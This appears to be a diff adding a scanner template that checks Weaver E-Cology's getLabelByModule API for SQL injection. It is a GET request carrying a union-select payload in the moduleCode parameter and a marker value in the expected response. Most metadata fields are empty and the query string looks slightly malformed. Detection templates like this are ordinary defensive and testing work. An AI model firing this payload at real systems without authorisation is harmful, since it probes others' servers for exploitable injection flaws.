@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 泛微E-Cology getLabelByModule SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,1123123'+--
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+response1:
+  headers:
+  body: 1123123
+  code:
+requests2:
+response2:
